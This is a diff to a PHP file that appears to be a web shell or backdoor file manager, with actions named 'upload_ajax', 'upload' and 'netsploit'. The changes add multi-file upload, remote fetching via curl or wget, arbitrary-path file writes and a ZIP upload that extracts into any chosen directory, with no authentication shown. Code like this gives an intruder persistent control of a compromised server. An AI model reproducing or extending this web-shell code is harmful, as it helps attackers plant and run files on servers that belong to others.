@@ -252,7 +252,23 @@ function magicboom($text){
     return $text;
 }
 function timeAgo($timestamp) {
+   
+    if (!$timestamp || $timestamp <= 0) {
+        return 'N/A';
+    }
+    
+   
+    if ($timestamp > time()) {
+        return 'new';
+    }
+    
     $time_ago = time() - $timestamp;
+    
+   
+    if ($time_ago > 315360000) {
+        return date('Y-m-d', $timestamp);
+    }
+    
     if ($time_ago < 60) {
         return $time_ago . 's';
     } elseif ($time_ago < 3600) {
@@ -550,13 +566,15 @@ if(isset($_GET['x']) && $_GET['x'] == 'upload_ajax'){
         echo json_encode($response);
         exit;
     }
+    
+   
     if (!isset($_FILES['file_upload']) || $_FILES['file_upload']['error'] !== UPLOAD_ERR_OK) {
         $response['message'] = 'No file uploaded';
         header('Content-Type: application/json');
         echo json_encode($response);
         exit;
     }
-    $file = $_FILES['file_upload'];
+    
     $file_path = isset($_POST['file_path']) ? $_POST['file_path'] : '';
     if (empty($file_path)) {
         $response['message'] = 'No file path specified';
@@ -564,6 +582,9 @@ if(isset($_GET['x']) && $_GET['x'] == 'upload_ajax'){
         echo json_encode($response);
         exit;
     }
+    
+   
+    $file = $_FILES['file_upload'];
     $content = file_get_contents($file['tmp_name']);
     if (file_put_contents($file_path, $content) !== false) {
         $response['success'] = true;
@@ -573,6 +594,7 @@ if(isset($_GET['x']) && $_GET['x'] == 'upload_ajax'){
     } else {
         $response['message'] = 'Failed to write file';
     }
+    
     header('Content-Type: application/json');
     echo json_encode($response);
     exit;
@@ -1190,11 +1212,11 @@ saveBtn.style.background = '#CECECE';
     
     <script src="f7p-assets/_script_editpage.js"></script>
     <script src="f7p-assets/_script.js"></script>
-        <?php
-    }
-    elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
+        <?php }
+elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
     $msg_url = '';
     $msg_file = '';
+    $msg_zip = '';
     
     if(isset($_POST['uploadurl'])){
         $pilihan = trim($_POST['pilihan']);
@@ -1213,106 +1235,176 @@ saveBtn.style.background = '#CECECE';
     }
     
     if(isset($_POST['uploadcomp'])){
-        if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK){
-            $file = $_FILES['file'];
+        if(isset($_FILES['file']) && $_FILES['file']['error'] !== UPLOAD_ERR_NO_FILE){
             $target_dir = isset($_POST['path']) ? $_POST['path'] : $pwd;
             if(!empty($target_dir) && substr($target_dir, -1) !== '/' && substr($target_dir, -1) !== '\\'){
                 $target_dir .= DIRECTORY_SEPARATOR;
             }
-            $original_name = basename($file['name']);
-            $dest = $target_dir . $original_name;
-            if(move_uploaded_file($file['tmp_name'], $dest)){
-                $msg_file = '✅ Upload successful! File: ' . htmlspecialchars($original_name);
-            } else {
-                $msg_file = '❌ Failed to save file. Check permissions.';
+            
+            $total_uploaded = 0;
+            $total_failed = 0;
+            
+            if (isset($_FILES['file']['name']) && is_array($_FILES['file']['name'])) {
+                $file_count = count($_FILES['file']['name']);
+                for ($i = 0; $i < $file_count; $i++) {
+                    if ($_FILES['file']['error'][$i] === UPLOAD_ERR_OK) {
+                        $original_name = basename($_FILES['file']['name'][$i]);
+                        $dest = $target_dir . $original_name;
+                        if (move_uploaded_file($_FILES['file']['tmp_name'][$i], $dest)) {
+                            $total_uploaded++;
+                        } else {
+                            $total_failed++;
+                        }
+                    } else {
+                        $total_failed++;
+                    }
+                }
+                
+                if ($total_uploaded > 0) {
+                    $msg_file = '✅ ' . $total_uploaded . ' file(s) uploaded';
+                    if ($total_failed > 0) {
+                        $msg_file .= ' (' . $total_failed . ' failed)';
+                    }
+                } else {
+                    $msg_file = '❌ Upload failed';
+                }
             }
         } else {
-            $msg_file = '❌ No file uploaded or error occurred';
+            $msg_file = '❌ No file selected';
+        }
+    }
+    
+    if(isset($_POST['uploadzip'])){
+        if(isset($_FILES['zip_file']) && $_FILES['zip_file']['error'] === UPLOAD_ERR_OK){
+            $target_dir = isset($_POST['path']) ? $_POST['path'] : $pwd;
+            if(!empty($target_dir) && substr($target_dir, -1) !== '/' && substr($target_dir, -1) !== '\\'){
+                $target_dir .= DIRECTORY_SEPARATOR;
+            }
+            
+            $zip_name = basename($_FILES['zip_file']['name']);
+            $zip_ext = strtolower(pathinfo($zip_name, PATHINFO_EXTENSION));
+            
+            if($zip_ext !== 'zip'){
+                $msg_zip = '❌ Only ZIP files allowed!';
+            } else {
+                $zip_path = $target_dir . $zip_name;
+                
+                if(move_uploaded_file($_FILES['zip_file']['tmp_name'], $zip_path)){
+                    if(class_exists('ZipArchive')){
+                        $zip = new ZipArchive();
+                        if($zip->open($zip_path) === true){
+                            $zip->extractTo($target_dir);
+                            $zip->close();
+                            @unlink($zip_path);
+                            $msg_zip = '✅ Extracted: ' . htmlspecialchars($zip_name);
+                        } else {
+                            $msg_zip = '❌ Extract failed';
+                        }
+                    } else {
+                        $msg_zip = '❌ ZipArchive not available';
+                    }
+                } else {
+                    $msg_zip = '❌ Upload failed';
+                }
+            }
+        } else {
+            $msg_zip = '❌ No ZIP file';
         }
     }
     ?>
-    <div style="max-width:600px;margin:0 auto;padding:10px;">
-        
-        <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload" style="background:white;padding:20px;border-radius:12px;margin-bottom:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
-            <h3 style="font-size:15px;margin-bottom:12px;">Upload from URL</h3>
-            
-            <?php if ($msg_url): ?>
-                <div style="padding:12px;border-radius:8px;margin-bottom:12px;<?php echo strpos($msg_url, '✅') !== false ? 'background:#d4edda;color:#155724;border:1px solid #c3e6cb;' : 'background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;'; ?>">
-                    <?php echo $msg_url; ?>
-                </div>
-            <?php endif; ?>
-            
-            <div style="margin-bottom:12px;position:relative;">
-                <input class="inputz w-full" type="text" name="wurl" id="urlInput" placeholder="https://example.com/file.zip" style="padding:12px;padding-right:45px;">
-                <span id="urlPasteBtn" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;opacity:0.6;" title="Paste from clipboard">📋</span>
-            </div>
-            <input type="hidden" name="path" value="<?php echo $pwd; ?>">
-            <div style="margin-bottom:12px;">
-                <select class="inputz" style="width:100%;padding:12px;" name="pilihan">
-                    <option value="wcurl">curl (recommended)</option>
-                    <option value="wwget">wget</option>
-                    <option value="wfread">fread</option>
-                </select>
-            </div>
-            <input class="inputzbut" type="submit" name="uploadurl" value="Transfer" style="width:100%;padding:14px;background:#28a745;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">
-        </form>
-        
-        <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" style="background:white;padding:20px;border-radius:12px;margin-bottom:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
-            <h3 style="font-size:15px;margin-bottom:12px;">Upload from Computer</h3>
-            
-            <?php if ($msg_file): ?>
-                <div style="padding:12px;border-radius:8px;margin-bottom:12px;<?php echo strpos($msg_file, '✅') !== false ? 'background:#d4edda;color:#155724;border:1px solid #c3e6cb;' : 'background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;'; ?>">
-                    <?php echo $msg_file; ?>
-                </div>
-            <?php endif; ?>
-            
-            <div style="margin-bottom:12px;">
-                <input type="file" name="file" style="width:100%;padding:12px;border:2px dashed #ccc;border-radius:8px;background:#fafafa;font-size:14px;cursor:pointer;" required>
-            </div>
-            <input type="hidden" name="path" value="<?php echo $pwd; ?>">
-            <input class="inputzbut" type="submit" name="uploadcomp" value="Upload" style="width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">
-        </form>
-    </div>
+    <div class="upload-container">
     
-    <script>
-    (function(){
-        var urlPasteBtn = document.getElementById('urlPasteBtn');
-        var urlInput = document.getElementById('urlInput');
+    
+    <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload" class="upload-form">
+        <?php if ($msg_url): ?>
+            <div class="upload-msg <?php echo strpos($msg_url, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+                <?php echo $msg_url; ?>
+            </div>
+        <?php endif; ?>
         
-        if (urlPasteBtn && urlInput) {
-            urlPasteBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (!navigator.clipboard) {
-                    alert('Clipboard not available');
-                    return;
+        <div class="upload-row">
+            <div class="upload-input-wrap">
+                <input class="inputz" type="text" name="wurl" placeholder="Upload from URL">
+                <span class="upload-paste-btn" onclick="navigator.clipboard.readText().then(t=>{if(t)this.previousElementSibling.value=t})" title="Paste from clipboard">📋</span>
+            </div>
+            <select name="pilihan" class="upload-select">
+                <option value="wcurl">curl</option>
+                <option value="wwget">wget</option>
+                <option value="wfread">fread</option>
+            </select>
+            <input class="upload-btn-go" type="submit" name="uploadurl" value="Go">
+        </div>
+        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+    </form>
+    
+    
+    <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form">
+        <?php if ($msg_file): ?>
+            <div class="upload-msg <?php echo strpos($msg_file, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+                <?php echo $msg_file; ?>
+            </div>
+        <?php endif; ?>
+        
+        <div class="upload-row">
+            <input type="file" name="file[]" multiple id="localFileInput" class="upload-file-input">
+            <input class="upload-btn-local" type="button" value="📁 Upload from Local" onclick="document.getElementById('localFileInput').click();">
+            <span id="localFileCount" class="upload-file-count upload-file-count-local"></span>
+            <input class="upload-btn-upload" type="submit" name="uploadcomp" value="Upload">
+        </div>
+        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+    </form>
+    
+    
+    <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form upload-form-zip">
+        <?php if ($msg_zip): ?>
+            <div class="upload-msg <?php echo strpos($msg_zip, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+                <?php echo $msg_zip; ?>
+            </div>
+        <?php endif; ?>
+        
+        <div class="upload-row">
+            <input type="file" name="zip_file" accept=".zip" id="zipFileInput" class="upload-file-input">
+            <input class="upload-btn-zip" type="button" value="📦 Upload + Unzip" onclick="document.getElementById('zipFileInput').click();">
+            <span id="zipFileCount" class="upload-file-count upload-file-count-zip"></span>
+            <input class="upload-btn-extract" type="submit" name="uploadzip" value="Extract">
+        </div>
+        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+    </form>
+    
+</div>
+    <script>
+    (function() {
+        var localInput = document.getElementById('localFileInput');
+        var localCount = document.getElementById('localFileCount');
+        if (localInput && localCount) {
+            localInput.addEventListener('change', function() {
+                var count = this.files.length;
+                if (count > 0) {
+                    localCount.textContent = count + ' file(s)';
+                    localCount.style.color = '#0066cc';
+                } else {
+                    localCount.textContent = '';
                 }
-                var btn = this;
-                var origText = btn.textContent;
-                btn.textContent = '⏳';
-                navigator.clipboard.readText().then(function(text) {
-                    if (text && text.trim() !== '') {
-                        urlInput.value = text.trim();
-                        urlInput.dispatchEvent(new Event('input'));
-                        btn.textContent = '✅';
-                        setTimeout(function() {
-                            btn.textContent = origText;
-                        }, 1500);
-                    } else {
-                        btn.textContent = '❌';
-                        setTimeout(function() {
-                            btn.textContent = origText;
-                        }, 1500);
-                    }
-                }).catch(function() {
-                    btn.textContent = '❌';
-                    setTimeout(function() {
-                        btn.textContent = origText;
-                    }, 1500);
-                });
+            });
+        }
+        
+        var zipInput = document.getElementById('zipFileInput');
+        var zipCount = document.getElementById('zipFileCount');
+        if (zipInput && zipCount) {
+            zipInput.addEventListener('change', function() {
+                var file = this.files[0];
+                if (file) {
+                    var size = (file.size / 1024 / 1024).toFixed(2);
+                    zipCount.textContent = file.name + ' (' + size + 'MB)';
+                    zipCount.style.color = '#ff9800';
+                } else {
+                    zipCount.textContent = '';
+                }
             });
         }
     })();
     </script>
+    
     <?php
 }
     elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){
